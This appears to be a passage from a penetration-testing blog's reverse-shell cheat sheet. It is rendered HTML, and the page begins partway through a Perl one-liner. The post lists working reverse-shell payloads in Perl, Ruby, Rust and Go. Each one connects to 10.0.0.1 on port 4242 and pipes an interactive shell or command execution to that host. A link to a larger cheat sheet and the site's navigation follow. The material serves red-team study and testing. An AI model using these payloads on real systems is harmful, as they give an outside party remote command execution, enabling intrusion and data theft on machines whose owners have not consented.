</span></span><span class="line"><span class="cl"><span class="n">perl</span> <span class="o">-</span><span class="n">MIO</span> <span class="o">-</span><span class="n">e</span> <span class="s">&#39;$c=new IO::Socket::INET(PeerAddr,&#34;10.0.0.1:4242&#34;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</span>
</span></span></code></pre></div><h1 id="ruby">Ruby<a hidden class="anchor" aria-hidden="true" href="#ruby">#</a></h1>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">ruby</span> <span class="o">-</span><span class="n">rsocket</span> <span class="o">-</span><span class="n">e</span><span class="s1">&#39;f=TCPSocket.open(&#34;10.0.0.1&#34;,4242).to_i;exec sprintf(&#34;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&#34;,f,f,f)&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">ruby</span> <span class="o">-</span><span class="n">rsocket</span> <span class="o">-</span><span class="n">e</span><span class="s1">&#39;exit if fork;c=TCPSocket.new(&#34;10.0.0.1&#34;,&#34;4242&#34;);loop{c.gets.chomp!;(exit! if $_==&#34;exit&#34;);($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts &#34;failed: #{$_}&#34;}&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="ss">NOTE</span><span class="p">:</span> <span class="no">Windows</span> <span class="n">only</span>
</span></span><span class="line"><span class="cl"><span class="n">ruby</span> <span class="o">-</span><span class="n">rsocket</span> <span class="o">-</span><span class="n">e</span> <span class="s1">&#39;c=TCPSocket.new(&#34;10.0.0.1&#34;,&#34;4242&#34;);while(cmd=c.gets);IO.popen(cmd,&#34;r&#34;){|io|c.print io.read}end&#39;</span>
</span></span></code></pre></div><h1 id="rust">Rust<a hidden class="anchor" aria-hidden="true" href="#rust">#</a></h1>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rust" data-lang="rust"><span class="line"><span class="cl"><span class="k">use</span><span class="w"> </span><span class="n">std</span>::<span class="n">net</span>::<span class="n">TcpStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="k">use</span><span class="w"> </span><span class="n">std</span>::<span class="n">os</span>::<span class="n">unix</span>::<span class="n">io</span>::<span class="p">{</span><span class="n">AsRawFd</span><span class="p">,</span><span class="w"> </span><span class="n">FromRawFd</span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="k">use</span><span class="w"> </span><span class="n">std</span>::<span class="n">process</span>::<span class="p">{</span><span class="n">Command</span><span class="p">,</span><span class="w"> </span><span class="n">Stdio</span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TcpStream</span>::<span class="n">connect</span><span class="p">(</span><span class="s">&#34;10.0.0.1:4242&#34;</span><span class="p">).</span><span class="n">unwrap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="n">as_raw_fd</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Command</span>::<span class="n">new</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">.</span><span class="n">arg</span><span class="p">(</span><span class="s">&#34;-i&#34;</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">.</span><span class="n">stdin</span><span class="p">(</span><span class="k">unsafe</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">Stdio</span>::<span class="n">from_raw_fd</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span><span class="w"> </span><span class="p">})</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">.</span><span class="n">stdout</span><span class="p">(</span><span class="k">unsafe</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">Stdio</span>::<span class="n">from_raw_fd</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span><span class="w"> </span><span class="p">})</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">.</span><span class="n">stderr</span><span class="p">(</span><span class="k">unsafe</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">Stdio</span>::<span class="n">from_raw_fd</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span><span class="w"> </span><span class="p">})</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">.</span><span class="n">spawn</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">.</span><span class="n">unwrap</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">.</span><span class="n">wait</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">.</span><span class="n">unwrap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><h1 id="golang">Golang<a hidden class="anchor" aria-hidden="true" href="#golang">#</a></h1>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-golang" data-lang="golang"><span class="line"><span class="cl"><span class="nx">echo</span><span class="w"> </span><span class="err">&#39;</span><span class="kn">package</span><span class="w"> </span><span class="nx">main</span><span class="p">;</span><span class="kn">import</span><span class="s">&#34;os/exec&#34;</span><span class="p">;</span><span class="kn">import</span><span class="s">&#34;net&#34;</span><span class="p">;</span><span class="kd">func</span><span class="w"> </span><span class="nf">main</span><span class="p">(){</span><span class="nx">c</span><span class="p">,</span><span class="nx">_</span><span class="o">:=</span><span class="nx">net</span><span class="p">.</span><span class="nf">Dial</span><span class="p">(</span><span class="s">&#34;tcp&#34;</span><span class="p">,</span><span class="s">&#34;10.0.0.1:4242&#34;</span><span class="p">);</span><span class="nx">cmd</span><span class="o">:=</span><span class="nx">exec</span><span class="p">.</span><span class="nf">Command</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span><span class="nx">cmd</span><span class="p">.</span><span class="nx">Stdin</span><span class="p">=</span><span class="nx">c</span><span class="p">;</span><span class="nx">cmd</span><span class="p">.</span><span class="nx">Stdout</span><span class="p">=</span><span class="nx">c</span><span class="p">;</span><span class="nx">cmd</span><span class="p">.</span><span class="nx">Stderr</span><span class="p">=</span><span class="nx">c</span><span class="p">;</span><span class="nx">cmd</span><span class="p">.</span><span class="nf">Run</span><span class="p">()}</span><span class="err">&#39;</span><span class="w"> </span><span class="p">&gt;</span><span class="w"> </span><span class="o">/</span><span class="nx">tmp</span><span class="o">/</span><span class="nx">t</span><span class="p">.</span><span class="k">go</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="k">go</span><span class="w"> </span><span class="nx">run</span><span class="w"> </span><span class="o">/</span><span class="nx">tmp</span><span class="o">/</span><span class="nx">t</span><span class="p">.</span><span class="k">go</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">rm</span><span class="w"> </span><span class="o">/</span><span class="nx">tmp</span><span class="o">/</span><span class="nx">t</span><span class="p">.</span><span class="k">go</span><span class="w">
</span></span></span></code></pre></div><p>Resources: <a href="https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet">https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet</a></p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="http://localhost:1313/tags/reverse-shell/">Reverse-Shell</a></li>
      <li><a href="http://localhost:1313/tags/post-exploitation/">Post-Exploitation</a></li>
      <li><a href="http://localhost:1313/tags/red-teaming/">Red-Teaming</a></li>
      <li><a href="http://localhost:1313/tags/ethical-hacking-community/">Ethical-Hacking-Community</a></li>
      <li><a href="http://localhost:1313/tags/python-scripting/">Python-Scripting</a></li>
      <li><a href="http://localhost:1313/tags/powershell-reverse-shell/">Powershell-Reverse-Shell</a></li>
      <li><a href="http://localhost:1313/tags/code-snippets/">Code-Snippets</a></li>
      <li><a href="http://localhost:1313/tags/cross-platform/">Cross-Platform</a></li>
      <li><a href="http://localhost:1313/tags/shell-scripting/">Shell-Scripting</a></li>
    </ul>
<nav class="paginav">
    <a class="prev" href="/posts/penetration-testing/webvulnerability/-php-reverse-shell--webshell-cheat-sheet/">
        <span class="title"> Prev</span>
        <br>
        <span>PHP Reverse Shell &amp; Webshell Cheat Sheet</span>
    </a>
    <a class="next" href="/posts/penetration-testing/webvulnerability/-python-reverse-shell-cheat-sheet/">
        <span class="title">Next </span>
        <br>
        <span>Python Reverse Shell Cheat Sheet</span>
    </a>
</nav>
  </footer>
</article>
          <div style="margin-top: auto">
            <div class="content-footer">
              <div> 2025 <a href="https://x.com/NoobGajen">Gajendra Mahato</a>. Some rights reserved.</div>
              <div>Using the <a href="https://github.com/adityatelange/hugo-PaperMod">PaperMod</a> theme for <a
                  href="https://gohugo.io/">Hugo</a>.</div>
            </div>
          </div>

        </div>
        <div class="right-sidebar">
    <section>
        <h2>Recently Added</h2>

        
        <div><a href="http://localhost:1313/posts/overthewire-bandit/bandit-level-0-level-1/">Bandit: Level 0 =&gt; Level 1</a></div>
        
        <div><a href="http://localhost:1313/posts/overthewire-bandit/bandit-level-1-level-2/">Bandit: Level 1 =&gt; Level 2</a></div>
        
        <div><a href="http://localhost:1313/posts/overthewire-bandit/bandit-level-2-level-3/">Bandit: Level 2 =&gt; Level 3</a></div>
        
        <div><a href="http://localhost:1313/posts/overthewire-bandit/bandit-level-3-level-4/">Bandit: Level 3 =&gt; Level 4</a></div>
        
        <div><a href="http://localhost:1313/posts/overthewire-bandit/bandit-level-4-level-5/">Bandit: Level 4 =&gt; Level 5</a></div>
        
    </section>

    <section>
        <h2>Trending Tags</h2>
              
        <a class="sidebar-tag" href="http://localhost:1313/tags/overthewire/"> OverTheWire </a>
                                                                                                                                                                                                                                                            
        <a class="sidebar-tag" href="http://localhost:1313/tags/blog/"> Blog </a>
                                                                                                                                                                   
    </section>

    <section id="post-content">
        <h2>Table of Content</h2>
        <nav id="TableOfContents">
  <ul>
    <li><a href="#reverse-shell">Reverse Shell</a></li>
    <li><a href="#ipv4">IPv4</a></li>
    <li><a href="#ipv4-no-spaces">IPv4 (No Spaces)</a></li>
    <li><a href="#ipv4-no-spaces-shortened">IPv4 (No Spaces, Shortened)</a></li>
    <li><a href="#ipv4-no-spaces-shortened-further">IPv4 (No Spaces, Shortened Further)</a></li>
    <li><a href="#ipv6">IPv6</a></li>
    <li><a href="#ipv6-no-spaces">IPv6 (No Spaces)</a></li>
    <li><a href="#ipv6-no-spaces-shortened">IPv6 (No Spaces, Shortened)</a></li>
    <li><a href="#windows-only-python2">Windows only (Python2)</a></li>
    <li><a href="#windows-only-python3">Windows only (Python3)</a></li>
  </ul>
</nav>
    </section>
</div>



        <div class="search-results-wrapper">
          <div class="search-results-list">
          </div>
        </div>
      </div>
    </main>
  </div>

  
  <button id="scrollToTop" class="scroll-to-top">
    <i class="fa-solid fa-arrow-up"></i>
  </button>
  

  <div class="mobile-search-layout">
    <header>
      <div class="search-container"><span class="absolute left-3 top-2.5 text-gray-400">
          <i class="fas fa-search"></i>
        </span>
        <input id="mobile-search-input" type="text" placeholder="Search..."
          class="w-full border rounded-lg py-2 pl-10 pr-4 focus:outline-none focus:ring-2 focus:ring-blue-500" />
      </div><button class="cancel-btn">Cancel</button>
    </header>
    <div class="search-results-list mobile-search-results-list"></div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/fuse.js@6.6.2"></script>
  
  <script src="/js/main.min.6cd0146acf9838eb3d5ac7ebaad0cd534927930fd1c398e8847e358ea1dedbff.js" integrity="sha256-bNAUas&#43;YOOs9WsfrqtDNU0knkw/Rw5johH41jqHe2/8="></script>
</body>

</html>